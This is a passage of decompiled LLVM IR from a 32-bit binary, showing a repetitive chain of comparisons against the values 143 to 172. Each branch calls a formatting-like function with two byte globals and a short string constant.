  %v0_804beda = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804beda = zext i8 %v0_804beda to i32
  %v2_804bee9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bee9, i32* @ebx, align 4
  %v5_804befb = call i32 @function_8048c55(i32 %v2_804bee9, i32 ptrtoint ([13 x i8]* @global_var_805b113.185 to i32), i32 %v1_804beda, i32 %v1_804bed0)
  br label %dec_label_pc_804bf00

dec_label_pc_804bf00:                             ; preds = %dec_label_pc_804bec7, %dec_label_pc_804bed0
  %v13_804bf00 = icmp eq i32 %v2_804a0a2, 143
  %v1_804bf07 = icmp eq i1 %v13_804bf00, false
  br i1 %v1_804bf07, label %dec_label_pc_804bf39, label %dec_label_pc_804bf09

dec_label_pc_804bf09:                             ; preds = %dec_label_pc_804bf00
  %v0_804bf09 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bf09 = zext i8 %v0_804bf09 to i32
  store i32 %v1_804bf09, i32* @edx, align 4
  %v0_804bf13 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bf13 = zext i8 %v0_804bf13 to i32
  %v2_804bf22 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf22, i32* @ebx, align 4
  %v5_804bf34 = call i32 @function_8048c55(i32 %v2_804bf22, i32 ptrtoint ([13 x i8]* @global_var_805b120.186 to i32), i32 %v1_804bf13, i32 %v1_804bf09)
  br label %dec_label_pc_804bf39

dec_label_pc_804bf39:                             ; preds = %dec_label_pc_804bf00, %dec_label_pc_804bf09
  %v10_804bf39 = icmp eq i32 %v2_804a0a2, 144
  %v1_804bf40 = icmp eq i1 %v10_804bf39, false
  br i1 %v1_804bf40, label %dec_label_pc_804bf72, label %dec_label_pc_804bf42

dec_label_pc_804bf42:                             ; preds = %dec_label_pc_804bf39
  %v0_804bf42 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bf42 = zext i8 %v0_804bf42 to i32
  store i32 %v1_804bf42, i32* @edx, align 4
  %v0_804bf4c = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bf4c = zext i8 %v0_804bf4c to i32
  %v2_804bf5b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf5b, i32* @ebx, align 4
  %v5_804bf6d = call i32 @function_8048c55(i32 %v2_804bf5b, i32 ptrtoint ([13 x i8]* @global_var_805b12d.187 to i32), i32 %v1_804bf4c, i32 %v1_804bf42)
  br label %dec_label_pc_804bf72

dec_label_pc_804bf72:                             ; preds = %dec_label_pc_804bf39, %dec_label_pc_804bf42
  %v13_804bf72 = icmp eq i32 %v2_804a0a2, 145
  %v1_804bf79 = icmp eq i1 %v13_804bf72, false
  br i1 %v1_804bf79, label %dec_label_pc_804bfab, label %dec_label_pc_804bf7b

dec_label_pc_804bf7b:                             ; preds = %dec_label_pc_804bf72
  %v0_804bf7b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bf7b = zext i8 %v0_804bf7b to i32
  store i32 %v1_804bf7b, i32* @edx, align 4
  %v0_804bf85 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bf85 = zext i8 %v0_804bf85 to i32
  %v2_804bf94 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf94, i32* @ebx, align 4
  %v5_804bfa6 = call i32 @function_8048c55(i32 %v2_804bf94, i32 ptrtoint ([13 x i8]* @global_var_805b13a.188 to i32), i32 %v1_804bf85, i32 %v1_804bf7b)
  br label %dec_label_pc_804bfab

dec_label_pc_804bfab:                             ; preds = %dec_label_pc_804bf72, %dec_label_pc_804bf7b
  %v13_804bfab = icmp eq i32 %v2_804a0a2, 146
  %v1_804bfb2 = icmp eq i1 %v13_804bfab, false
  br i1 %v1_804bfb2, label %dec_label_pc_804bfe4, label %dec_label_pc_804bfb4

dec_label_pc_804bfb4:                             ; preds = %dec_label_pc_804bfab
  %v0_804bfb4 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bfb4 = zext i8 %v0_804bfb4 to i32
  store i32 %v1_804bfb4, i32* @edx, align 4
  %v0_804bfbe = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bfbe = zext i8 %v0_804bfbe to i32
  %v2_804bfcd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bfcd, i32* @ebx, align 4
  %v5_804bfdf = call i32 @function_8048c55(i32 %v2_804bfcd, i32 ptrtoint ([13 x i8]* @global_var_805b147.189 to i32), i32 %v1_804bfbe, i32 %v1_804bfb4)
  br label %dec_label_pc_804bfe4

dec_label_pc_804bfe4:                             ; preds = %dec_label_pc_804bfab, %dec_label_pc_804bfb4
  %v13_804bfe4 = icmp eq i32 %v2_804a0a2, 147
  %v1_804bfeb = icmp eq i1 %v13_804bfe4, false
  br i1 %v1_804bfeb, label %dec_label_pc_804c01d, label %dec_label_pc_804bfed

dec_label_pc_804bfed:                             ; preds = %dec_label_pc_804bfe4
  %v0_804bfed = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bfed = zext i8 %v0_804bfed to i32
  store i32 %v1_804bfed, i32* @edx, align 4
  %v0_804bff7 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bff7 = zext i8 %v0_804bff7 to i32
  %v2_804c006 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c006, i32* @ebx, align 4
  %v5_804c018 = call i32 @function_8048c55(i32 %v2_804c006, i32 ptrtoint ([13 x i8]* @global_var_805b154.190 to i32), i32 %v1_804bff7, i32 %v1_804bfed)
  br label %dec_label_pc_804c01d

dec_label_pc_804c01d:                             ; preds = %dec_label_pc_804bfe4, %dec_label_pc_804bfed
  %v13_804c01d = icmp eq i32 %v2_804a0a2, 148
  %v1_804c024 = icmp eq i1 %v13_804c01d, false
  br i1 %v1_804c024, label %dec_label_pc_804c056, label %dec_label_pc_804c026

dec_label_pc_804c026:                             ; preds = %dec_label_pc_804c01d
  %v0_804c026 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c026 = zext i8 %v0_804c026 to i32
  store i32 %v1_804c026, i32* @edx, align 4
  %v0_804c030 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c030 = zext i8 %v0_804c030 to i32
  %v2_804c03f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c03f, i32* @ebx, align 4
  %v5_804c051 = call i32 @function_8048c55(i32 %v2_804c03f, i32 ptrtoint ([13 x i8]* @global_var_805b161.191 to i32), i32 %v1_804c030, i32 %v1_804c026)
  br label %dec_label_pc_804c056

dec_label_pc_804c056:                             ; preds = %dec_label_pc_804c01d, %dec_label_pc_804c026
  %v13_804c056 = icmp eq i32 %v2_804a0a2, 149
  %v1_804c05d = icmp eq i1 %v13_804c056, false
  br i1 %v1_804c05d, label %dec_label_pc_804c08f, label %dec_label_pc_804c05f

dec_label_pc_804c05f:                             ; preds = %dec_label_pc_804c056
  %v0_804c05f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c05f = zext i8 %v0_804c05f to i32
  store i32 %v1_804c05f, i32* @edx, align 4
  %v0_804c069 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c069 = zext i8 %v0_804c069 to i32
  %v2_804c078 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c078, i32* @ebx, align 4
  %v5_804c08a = call i32 @function_8048c55(i32 %v2_804c078, i32 ptrtoint ([13 x i8]* @global_var_805b16e.192 to i32), i32 %v1_804c069, i32 %v1_804c05f)
  br label %dec_label_pc_804c08f

dec_label_pc_804c08f:                             ; preds = %dec_label_pc_804c056, %dec_label_pc_804c05f
  %v13_804c08f = icmp eq i32 %v2_804a0a2, 150
  %v1_804c096 = icmp eq i1 %v13_804c08f, false
  br i1 %v1_804c096, label %dec_label_pc_804c0c8, label %dec_label_pc_804c098

dec_label_pc_804c098:                             ; preds = %dec_label_pc_804c08f
  %v0_804c098 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c098 = zext i8 %v0_804c098 to i32
  store i32 %v1_804c098, i32* @edx, align 4
  %v0_804c0a2 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c0a2 = zext i8 %v0_804c0a2 to i32
  %v2_804c0b1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0b1, i32* @ebx, align 4
  %v5_804c0c3 = call i32 @function_8048c55(i32 %v2_804c0b1, i32 ptrtoint ([13 x i8]* @global_var_805b17b.193 to i32), i32 %v1_804c0a2, i32 %v1_804c098)
  br label %dec_label_pc_804c0c8

dec_label_pc_804c0c8:                             ; preds = %dec_label_pc_804c08f, %dec_label_pc_804c098
  %v13_804c0c8 = icmp eq i32 %v2_804a0a2, 151
  %v1_804c0cf = icmp eq i1 %v13_804c0c8, false
  br i1 %v1_804c0cf, label %dec_label_pc_804c101, label %dec_label_pc_804c0d1

dec_label_pc_804c0d1:                             ; preds = %dec_label_pc_804c0c8
  %v0_804c0d1 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c0d1 = zext i8 %v0_804c0d1 to i32
  store i32 %v1_804c0d1, i32* @edx, align 4
  %v0_804c0db = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c0db = zext i8 %v0_804c0db to i32
  %v2_804c0ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0ea, i32* @ebx, align 4
  %v5_804c0fc = call i32 @function_8048c55(i32 %v2_804c0ea, i32 ptrtoint ([13 x i8]* @global_var_805b188.194 to i32), i32 %v1_804c0db, i32 %v1_804c0d1)
  br label %dec_label_pc_804c101

dec_label_pc_804c101:                             ; preds = %dec_label_pc_804c0c8, %dec_label_pc_804c0d1
  %v13_804c101 = icmp eq i32 %v2_804a0a2, 152
  %v1_804c108 = icmp eq i1 %v13_804c101, false
  br i1 %v1_804c108, label %dec_label_pc_804c13a, label %dec_label_pc_804c10a

dec_label_pc_804c10a:                             ; preds = %dec_label_pc_804c101
  %v0_804c10a = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c10a = zext i8 %v0_804c10a to i32
  store i32 %v1_804c10a, i32* @edx, align 4
  %v0_804c114 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c114 = zext i8 %v0_804c114 to i32
  %v2_804c123 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c123, i32* @ebx, align 4
  %v5_804c135 = call i32 @function_8048c55(i32 %v2_804c123, i32 ptrtoint ([13 x i8]* @global_var_805b195.195 to i32), i32 %v1_804c114, i32 %v1_804c10a)
  br label %dec_label_pc_804c13a

dec_label_pc_804c13a:                             ; preds = %dec_label_pc_804c101, %dec_label_pc_804c10a
  %v13_804c13a = icmp eq i32 %v2_804a0a2, 153
  %v1_804c141 = icmp eq i1 %v13_804c13a, false
  br i1 %v1_804c141, label %dec_label_pc_804c173, label %dec_label_pc_804c143

dec_label_pc_804c143:                             ; preds = %dec_label_pc_804c13a
  %v0_804c143 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c143 = zext i8 %v0_804c143 to i32
  store i32 %v1_804c143, i32* @edx, align 4
  %v0_804c14d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c14d = zext i8 %v0_804c14d to i32
  %v2_804c15c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c15c, i32* @ebx, align 4
  %v5_804c16e = call i32 @function_8048c55(i32 %v2_804c15c, i32 ptrtoint ([13 x i8]* @global_var_805b1a2.196 to i32), i32 %v1_804c14d, i32 %v1_804c143)
  br label %dec_label_pc_804c173

dec_label_pc_804c173:                             ; preds = %dec_label_pc_804c13a, %dec_label_pc_804c143
  %v13_804c173 = icmp eq i32 %v2_804a0a2, 154
  %v1_804c17a = icmp eq i1 %v13_804c173, false
  br i1 %v1_804c17a, label %dec_label_pc_804c1ac, label %dec_label_pc_804c17c

dec_label_pc_804c17c:                             ; preds = %dec_label_pc_804c173
  %v0_804c17c = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c17c = zext i8 %v0_804c17c to i32
  store i32 %v1_804c17c, i32* @edx, align 4
  %v0_804c186 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c186 = zext i8 %v0_804c186 to i32
  %v2_804c195 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c195, i32* @ebx, align 4
  %v5_804c1a7 = call i32 @function_8048c55(i32 %v2_804c195, i32 ptrtoint ([13 x i8]* @global_var_805b1af.197 to i32), i32 %v1_804c186, i32 %v1_804c17c)
  br label %dec_label_pc_804c1ac

dec_label_pc_804c1ac:                             ; preds = %dec_label_pc_804c173, %dec_label_pc_804c17c
  %v13_804c1ac = icmp eq i32 %v2_804a0a2, 155
  %v1_804c1b3 = icmp eq i1 %v13_804c1ac, false
  br i1 %v1_804c1b3, label %dec_label_pc_804c1e5, label %dec_label_pc_804c1b5

dec_label_pc_804c1b5:                             ; preds = %dec_label_pc_804c1ac
  %v0_804c1b5 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c1b5 = zext i8 %v0_804c1b5 to i32
  store i32 %v1_804c1b5, i32* @edx, align 4
  %v0_804c1bf = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c1bf = zext i8 %v0_804c1bf to i32
  %v2_804c1ce = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1ce, i32* @ebx, align 4
  %v5_804c1e0 = call i32 @function_8048c55(i32 %v2_804c1ce, i32 ptrtoint ([13 x i8]* @global_var_805b1bc.198 to i32), i32 %v1_804c1bf, i32 %v1_804c1b5)
  br label %dec_label_pc_804c1e5

dec_label_pc_804c1e5:                             ; preds = %dec_label_pc_804c1ac, %dec_label_pc_804c1b5
  %v13_804c1e5 = icmp eq i32 %v2_804a0a2, 156
  %v1_804c1ec = icmp eq i1 %v13_804c1e5, false
  br i1 %v1_804c1ec, label %dec_label_pc_804c21e, label %dec_label_pc_804c1ee

dec_label_pc_804c1ee:                             ; preds = %dec_label_pc_804c1e5
  %v0_804c1ee = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c1ee = zext i8 %v0_804c1ee to i32
  store i32 %v1_804c1ee, i32* @edx, align 4
  %v0_804c1f8 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c1f8 = zext i8 %v0_804c1f8 to i32
  %v2_804c207 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c207, i32* @ebx, align 4
  %v5_804c219 = call i32 @function_8048c55(i32 %v2_804c207, i32 ptrtoint ([13 x i8]* @global_var_805b1c9.199 to i32), i32 %v1_804c1f8, i32 %v1_804c1ee)
  br label %dec_label_pc_804c21e

dec_label_pc_804c21e:                             ; preds = %dec_label_pc_804c1e5, %dec_label_pc_804c1ee
  %v13_804c21e = icmp eq i32 %v2_804a0a2, 157
  %v1_804c225 = icmp eq i1 %v13_804c21e, false
  br i1 %v1_804c225, label %dec_label_pc_804c257, label %dec_label_pc_804c227

dec_label_pc_804c227:                             ; preds = %dec_label_pc_804c21e
  %v0_804c227 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c227 = zext i8 %v0_804c227 to i32
  store i32 %v1_804c227, i32* @edx, align 4
  %v0_804c231 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c231 = zext i8 %v0_804c231 to i32
  %v2_804c240 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c240, i32* @ebx, align 4
  %v5_804c252 = call i32 @function_8048c55(i32 %v2_804c240, i32 ptrtoint ([13 x i8]* @global_var_805b1d6.200 to i32), i32 %v1_804c231, i32 %v1_804c227)
  br label %dec_label_pc_804c257

dec_label_pc_804c257:                             ; preds = %dec_label_pc_804c21e, %dec_label_pc_804c227
  %v13_804c257 = icmp eq i32 %v2_804a0a2, 158
  %v1_804c25e = icmp eq i1 %v13_804c257, false
  br i1 %v1_804c25e, label %dec_label_pc_804c290, label %dec_label_pc_804c260

dec_label_pc_804c260:                             ; preds = %dec_label_pc_804c257
  %v0_804c260 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c260 = zext i8 %v0_804c260 to i32
  store i32 %v1_804c260, i32* @edx, align 4
  %v0_804c26a = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c26a = zext i8 %v0_804c26a to i32
  %v2_804c279 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c279, i32* @ebx, align 4
  %v5_804c28b = call i32 @function_8048c55(i32 %v2_804c279, i32 ptrtoint ([13 x i8]* @global_var_805b1e3.201 to i32), i32 %v1_804c26a, i32 %v1_804c260)
  br label %dec_label_pc_804c290

dec_label_pc_804c290:                             ; preds = %dec_label_pc_804c257, %dec_label_pc_804c260
  %v13_804c290 = icmp eq i32 %v2_804a0a2, 159
  %v1_804c297 = icmp eq i1 %v13_804c290, false
  br i1 %v1_804c297, label %dec_label_pc_804c2c9, label %dec_label_pc_804c299

dec_label_pc_804c299:                             ; preds = %dec_label_pc_804c290
  %v0_804c299 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c299 = zext i8 %v0_804c299 to i32
  store i32 %v1_804c299, i32* @edx, align 4
  %v0_804c2a3 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c2a3 = zext i8 %v0_804c2a3 to i32
  %v2_804c2b2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2b2, i32* @ebx, align 4
  %v5_804c2c4 = call i32 @function_8048c55(i32 %v2_804c2b2, i32 ptrtoint ([13 x i8]* @global_var_805b1f0.202 to i32), i32 %v1_804c2a3, i32 %v1_804c299)
  br label %dec_label_pc_804c2c9

dec_label_pc_804c2c9:                             ; preds = %dec_label_pc_804c290, %dec_label_pc_804c299
  %v10_804c2c9 = icmp eq i32 %v2_804a0a2, 160
  %v1_804c2d0 = icmp eq i1 %v10_804c2c9, false
  br i1 %v1_804c2d0, label %dec_label_pc_804c302, label %dec_label_pc_804c2d2

dec_label_pc_804c2d2:                             ; preds = %dec_label_pc_804c2c9
  %v0_804c2d2 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c2d2 = zext i8 %v0_804c2d2 to i32
  store i32 %v1_804c2d2, i32* @edx, align 4
  %v0_804c2dc = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c2dc = zext i8 %v0_804c2dc to i32
  %v2_804c2eb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2eb, i32* @ebx, align 4
  %v5_804c2fd = call i32 @function_8048c55(i32 %v2_804c2eb, i32 ptrtoint ([13 x i8]* @global_var_805b1fd.203 to i32), i32 %v1_804c2dc, i32 %v1_804c2d2)
  br label %dec_label_pc_804c302

dec_label_pc_804c302:                             ; preds = %dec_label_pc_804c2c9, %dec_label_pc_804c2d2
  %v13_804c302 = icmp eq i32 %v2_804a0a2, 161
  %v1_804c309 = icmp eq i1 %v13_804c302, false
  br i1 %v1_804c309, label %dec_label_pc_804c33b, label %dec_label_pc_804c30b

dec_label_pc_804c30b:                             ; preds = %dec_label_pc_804c302
  %v0_804c30b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c30b = zext i8 %v0_804c30b to i32
  store i32 %v1_804c30b, i32* @edx, align 4
  %v0_804c315 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c315 = zext i8 %v0_804c315 to i32
  %v2_804c324 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c324, i32* @ebx, align 4
  %v5_804c336 = call i32 @function_8048c55(i32 %v2_804c324, i32 ptrtoint ([12 x i8]* @global_var_805b20a.204 to i32), i32 %v1_804c315, i32 %v1_804c30b)
  br label %dec_label_pc_804c33b

dec_label_pc_804c33b:                             ; preds = %dec_label_pc_804c302, %dec_label_pc_804c30b
  %v13_804c33b = icmp eq i32 %v2_804a0a2, 162
  %v1_804c342 = icmp eq i1 %v13_804c33b, false
  br i1 %v1_804c342, label %dec_label_pc_804c374, label %dec_label_pc_804c344

dec_label_pc_804c344:                             ; preds = %dec_label_pc_804c33b
  %v0_804c344 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c344 = zext i8 %v0_804c344 to i32
  store i32 %v1_804c344, i32* @edx, align 4
  %v0_804c34e = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c34e = zext i8 %v0_804c34e to i32
  %v2_804c35d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c35d, i32* @ebx, align 4
  %v5_804c36f = call i32 @function_8048c55(i32 %v2_804c35d, i32 ptrtoint ([13 x i8]* @global_var_805b216.205 to i32), i32 %v1_804c34e, i32 %v1_804c344)
  br label %dec_label_pc_804c374

dec_label_pc_804c374:                             ; preds = %dec_label_pc_804c33b, %dec_label_pc_804c344
  %v13_804c374 = icmp eq i32 %v2_804a0a2, 163
  %v1_804c37b = icmp eq i1 %v13_804c374, false
  br i1 %v1_804c37b, label %dec_label_pc_804c3ad, label %dec_label_pc_804c37d

dec_label_pc_804c37d:                             ; preds = %dec_label_pc_804c374
  %v0_804c37d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c37d = zext i8 %v0_804c37d to i32
  store i32 %v1_804c37d, i32* @edx, align 4
  %v0_804c387 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c387 = zext i8 %v0_804c387 to i32
  %v2_804c396 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c396, i32* @ebx, align 4
  %v5_804c3a8 = call i32 @function_8048c55(i32 %v2_804c396, i32 ptrtoint ([13 x i8]* @global_var_805b223.206 to i32), i32 %v1_804c387, i32 %v1_804c37d)
  br label %dec_label_pc_804c3ad

dec_label_pc_804c3ad:                             ; preds = %dec_label_pc_804c374, %dec_label_pc_804c37d
  %v13_804c3ad = icmp eq i32 %v2_804a0a2, 164
  %v1_804c3b4 = icmp eq i1 %v13_804c3ad, false
  br i1 %v1_804c3b4, label %dec_label_pc_804c3e6, label %dec_label_pc_804c3b6

dec_label_pc_804c3b6:                             ; preds = %dec_label_pc_804c3ad
  %v0_804c3b6 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c3b6 = zext i8 %v0_804c3b6 to i32
  store i32 %v1_804c3b6, i32* @edx, align 4
  %v0_804c3c0 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c3c0 = zext i8 %v0_804c3c0 to i32
  %v2_804c3cf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c3cf, i32* @ebx, align 4
  %v5_804c3e1 = call i32 @function_8048c55(i32 %v2_804c3cf, i32 ptrtoint ([13 x i8]* @global_var_805b230.207 to i32), i32 %v1_804c3c0, i32 %v1_804c3b6)
  br label %dec_label_pc_804c3e6

dec_label_pc_804c3e6:                             ; preds = %dec_label_pc_804c3ad, %dec_label_pc_804c3b6
  %v13_804c3e6 = icmp eq i32 %v2_804a0a2, 165
  %v1_804c3ed = icmp eq i1 %v13_804c3e6, false
  br i1 %v1_804c3ed, label %dec_label_pc_804c41f, label %dec_label_pc_804c3ef

dec_label_pc_804c3ef:                             ; preds = %dec_label_pc_804c3e6
  %v0_804c3ef = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c3ef = zext i8 %v0_804c3ef to i32
  store i32 %v1_804c3ef, i32* @edx, align 4
  %v0_804c3f9 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c3f9 = zext i8 %v0_804c3f9 to i32
  %v2_804c408 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c408, i32* @ebx, align 4
  %v5_804c41a = call i32 @function_8048c55(i32 %v2_804c408, i32 ptrtoint ([12 x i8]* @global_var_805b23d.208 to i32), i32 %v1_804c3f9, i32 %v1_804c3ef)
  br label %dec_label_pc_804c41f

dec_label_pc_804c41f:                             ; preds = %dec_label_pc_804c3e6, %dec_label_pc_804c3ef
  %v13_804c41f = icmp eq i32 %v2_804a0a2, 166
  %v1_804c426 = icmp eq i1 %v13_804c41f, false
  br i1 %v1_804c426, label %dec_label_pc_804c458, label %dec_label_pc_804c428

dec_label_pc_804c428:                             ; preds = %dec_label_pc_804c41f
  %v0_804c428 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c428 = zext i8 %v0_804c428 to i32
  store i32 %v1_804c428, i32* @edx, align 4
  %v0_804c432 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c432 = zext i8 %v0_804c432 to i32
  %v2_804c441 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c441, i32* @ebx, align 4
  %v5_804c453 = call i32 @function_8048c55(i32 %v2_804c441, i32 ptrtoint ([13 x i8]* @global_var_805b249.209 to i32), i32 %v1_804c432, i32 %v1_804c428)
  br label %dec_label_pc_804c458

dec_label_pc_804c458:                             ; preds = %dec_label_pc_804c41f, %dec_label_pc_804c428
  %v13_804c458 = icmp eq i32 %v2_804a0a2, 167
  %v1_804c45f = icmp eq i1 %v13_804c458, false
  br i1 %v1_804c45f, label %dec_label_pc_804c491, label %dec_label_pc_804c461

dec_label_pc_804c461:                             ; preds = %dec_label_pc_804c458
  %v0_804c461 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c461 = zext i8 %v0_804c461 to i32
  store i32 %v1_804c461, i32* @edx, align 4
  %v0_804c46b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c46b = zext i8 %v0_804c46b to i32
  %v2_804c47a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c47a, i32* @ebx, align 4
  %v5_804c48c = call i32 @function_8048c55(i32 %v2_804c47a, i32 ptrtoint ([14 x i8]* @global_var_805b256.210 to i32), i32 %v1_804c46b, i32 %v1_804c461)
  br label %dec_label_pc_804c491

dec_label_pc_804c491:                             ; preds = %dec_label_pc_804c458, %dec_label_pc_804c461
  %v13_804c491 = icmp eq i32 %v2_804a0a2, 168
  %v1_804c498 = icmp eq i1 %v13_804c491, false
  br i1 %v1_804c498, label %dec_label_pc_804c4ca, label %dec_label_pc_804c49a

dec_label_pc_804c49a:                             ; preds = %dec_label_pc_804c491
  %v0_804c49a = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c49a = zext i8 %v0_804c49a to i32
  store i32 %v1_804c49a, i32* @edx, align 4
  %v0_804c4a4 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c4a4 = zext i8 %v0_804c4a4 to i32
  %v2_804c4b3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c4b3, i32* @ebx, align 4
  %v5_804c4c5 = call i32 @function_8048c55(i32 %v2_804c4b3, i32 ptrtoint ([14 x i8]* @global_var_805b264.211 to i32), i32 %v1_804c4a4, i32 %v1_804c49a)
  br label %dec_label_pc_804c4ca

dec_label_pc_804c4ca:                             ; preds = %dec_label_pc_804c491, %dec_label_pc_804c49a
  %v13_804c4ca = icmp eq i32 %v2_804a0a2, 169
  %v1_804c4d1 = icmp eq i1 %v13_804c4ca, false
  br i1 %v1_804c4d1, label %dec_label_pc_804c503, label %dec_label_pc_804c4d3

dec_label_pc_804c4d3:                             ; preds = %dec_label_pc_804c4ca
  %v0_804c4d3 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c4d3 = zext i8 %v0_804c4d3 to i32
  store i32 %v1_804c4d3, i32* @edx, align 4
  %v0_804c4dd = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c4dd = zext i8 %v0_804c4dd to i32
  %v2_804c4ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c4ec, i32* @ebx, align 4
  %v5_804c4fe = call i32 @function_8048c55(i32 %v2_804c4ec, i32 ptrtoint ([13 x i8]* @global_var_805b272.212 to i32), i32 %v1_804c4dd, i32 %v1_804c4d3)
  br label %dec_label_pc_804c503

dec_label_pc_804c503:                             ; preds = %dec_label_pc_804c4ca, %dec_label_pc_804c4d3
  %v13_804c503 = icmp eq i32 %v2_804a0a2, 170
  %v1_804c50a = icmp eq i1 %v13_804c503, false
  br i1 %v1_804c50a, label %dec_label_pc_804c53c, label %dec_label_pc_804c50c

dec_label_pc_804c50c:                             ; preds = %dec_label_pc_804c503
  %v0_804c50c = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c50c = zext i8 %v0_804c50c to i32
  store i32 %v1_804c50c, i32* @edx, align 4
  %v0_804c516 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c516 = zext i8 %v0_804c516 to i32
  %v2_804c525 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c525, i32* @ebx, align 4
  %v5_804c537 = call i32 @function_8048c55(i32 %v2_804c525, i32 ptrtoint ([14 x i8]* @global_var_805b27f.213 to i32), i32 %v1_804c516, i32 %v1_804c50c)
  br label %dec_label_pc_804c53c

dec_label_pc_804c53c:                             ; preds = %dec_label_pc_804c503, %dec_label_pc_804c50c
  %v13_804c53c = icmp eq i32 %v2_804a0a2, 171
  %v1_804c543 = icmp eq i1 %v13_804c53c, false
  br i1 %v1_804c543, label %dec_label_pc_804c575, label %dec_label_pc_804c545

dec_label_pc_804c545:                             ; preds = %dec_label_pc_804c53c
  %v0_804c545 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804c545 = zext i8 %v0_804c545 to i32
  store i32 %v1_804c545, i32* @edx, align 4
  %v0_804c54f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804c54f = zext i8 %v0_804c54f to i32
  %v2_804c55e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c55e, i32* @ebx, align 4
  %v5_804c570 = call i32 @function_8048c55(i32 %v2_804c55e, i32 ptrtoint ([14 x i8]* @global_var_805b28d.214 to i32), i32 %v1_804c54f, i32 %v1_804c545)
  br label %dec_label_pc_804c575

dec_label_pc_804c575:                             ; preds = %dec_label_pc_804c53c, %dec_label_pc_804c545
  %v13_804c575 = icmp eq i32 %v2_804a0a2, 172
  %v1_804c57c = icmp eq i1 %v13_804c575, false
